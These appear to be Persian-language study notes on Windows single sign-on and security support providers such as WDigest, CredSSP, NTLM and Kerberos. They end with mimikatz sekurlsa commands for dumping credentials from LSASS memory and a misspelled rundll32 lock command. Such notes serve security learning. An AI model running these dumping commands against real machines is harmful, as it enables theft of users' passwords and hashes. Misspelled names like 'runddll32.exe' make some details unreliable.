

SSO ----> (Single Sign On)

این مکانیزم برای شبکه های دامین مورد استفاده قرار میگیرد و به این معنی است که ما با Credential که داریم  بیایم و یک بار پسورد مون رو برای SPN استفاده کنیم و از دفعه هات بعد اون سرویس مارو به یاد داشته باشه و پسوردی دیگر وارد نکنیم

SSP ----> (Security Support Provider)

همونطور که از اسمش مشخصه یک Provider هست برای احراز هویت در سیستم عامل ویندوز که تایین میکنه که کاربر با استفاده از چه پروتوکلی باید احراز هویت بکنه 
در کل نوع احراز هویت هست 
که این عملیات توسط پروسس Lsass تایین میشود 

![[Screenshot 2025-08-30 084217.png]]

مثلا 

WDigest
 این احراز هویت مربوط به HTTP میشود 
 به احراز هویت هایی که در سطح HTTP پیاد سازی میشود و پشت صحنه به  Active Directory مربوط میشود از این نوع Provider استفاده میشود 
 SPN ----> Web ----> Https,Http



CreadSSP 
این Provider برای دسترسی ریموت در سیستم عامل ویندوز استفاده میشود یعنی پروتوکل هایی ازجمله 

RDP , PsRemoting , WINRM 
برای احراز هویت از این Provider استفاده میکنند



MSV ----> NTLM Authentication

Kerberos ----> domain/AD

LiveSSP -----> windows Live

TSpkg -----> Terminal Service ---> RDP

Creadman -------> IE/Edge




ما با استفاده از ابزار mimikatz میتونیم Credential های که مربوط به SSP های مختلف از روی پروسس Lsass هستند رو  dump کنیم 



```
sekurlsa::msv
```

credential dump via NTLM

```
sekurlsa::wdigest
```

credential dump of authentication in http and other web services ---> in AD ---> SPN

```
sekurlsa::logonpasswords
```

all credential SSP




lock system via runddll32.exe

```
runddll32.exe user32.dll,lockworkstation
```
